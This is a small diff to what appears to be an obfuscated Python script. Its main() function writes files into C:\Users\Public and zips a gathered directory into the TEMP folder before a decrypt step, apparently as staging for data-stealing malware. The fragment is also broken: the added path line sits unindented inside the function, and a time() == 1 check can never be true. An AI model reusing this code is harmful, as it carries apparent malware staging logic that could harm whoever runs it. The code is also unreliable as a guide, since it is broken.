@@ -455,6 +455,7 @@ def main():
     if os.path.exists(cx0h):
         gx0ch(dx0,cx0h)  
     python310_path = r'C:\Users\Public\Python310.zip'
+file_path = r'C:\Users\Public\Document\project.py'
     z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', dx0)
     if time() == 1 :
         decrypt(z_ph,number)
